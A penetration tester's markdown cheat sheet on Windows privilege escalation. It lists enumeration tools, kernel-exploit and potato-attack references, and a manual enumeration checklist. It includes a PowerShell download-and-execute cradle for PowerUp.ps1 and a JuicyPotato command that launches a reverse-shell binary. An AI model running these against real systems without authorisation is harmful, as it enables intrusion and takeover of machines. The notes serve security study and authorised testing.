# Scripts
## Enumeration
- winPEAS https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
- PowerUp.ps1 (https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- Nishang.ps1 (?)
- powerless.bat (https://github.com/M4ximuss/Powerless)

### PowerUp.ps1 usage
Example of use: powershell.exe iex (New-Object Net.Webclient).DownloadString('http://127.0.0.1/PowerUp.ps1')
(add "Invoke-AllChecks" at the end if you want to perform this function)

## Kernel exploits
- We can escalate from service account to SYSTEM (if SeImpersonatePrivilege) with juicy potato
- Windows XP SP1: upnphost is vulnerable (see https://www.fuzzysecurity.com/tutorials/16.html)
- Windows 7/8/10(if not patched)/server 2008/server 2012: vulnerable to hot potato (potato.exe)
- windows_exploit_suggester.py (https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
- windows-privesc-check2.exe (https://github.com/pentestmonkey/windows-privesc-check)

### juicy potato usage

JuicyPotato.exe -l 4445 -p revshell_443_exe.exe -t *

### windows_exploit_suggester.py usage
Run windows_exploit_suggester.py on systeminfo:

- python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt
- python wes.py /tools/systeminfo.txt -i 'Elevation of Privilege' --exploits-only |more

now check if the resulting CVEs are in the precompiled kernel exploits repository https://github.com/SecWiki/windows-kernel-exploits

### tricks for kernel exploits
- If "sc" command doesn't work on the target try "sc.exe"
- Always transfer .exe in binary mode in ftp

# Manual commands references
- https://guif.re/windowseop
- https://www.fuzzysecurity.com/tutorials/16.html
- https://www.youtube.com/playlist?list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP

# Manual enumeration
- Manual_privesc_commands_list.sh (this is NOT a bash script)

___Hostname___: may reveal the function of the machine

___Hostname___: may reveal the function of the machine

___OS version/architecture___: kernel exploits

___Processes___: processes running as privileged user may be of interest if they contain vulnerabilities

___Network/Firewall___: could reveal other networks to pivot to
could reveal port bindings on local machine that were not accessible by scanning
firewall rules can facilitate port forwarding/tunneling if we know which inbound/outbound ports are filtered

___Scheduled tasks___: we want to check here for insecure file permissions

___Installed applications/patch level___: we want to find vulnerable applications that could lead to privesc

___Readable/Writable files & directories___: looking to modify scripts or binaries executed under context of privileged account
also sensitive files containing hard-coded credentials

___Unmounted Disks___: not all drives are mounted at boot => we should look for unmounted drives
we might want to mount unmounted partitions to search for interesting documents/credentials/...

___Device drivers/Kernel modules___: get drivers/drivers versions/kernel version to look for exploits

___Binaries That AutoElevate___: if we can run a binary that is autoelevating we could craft one or use it to elevate
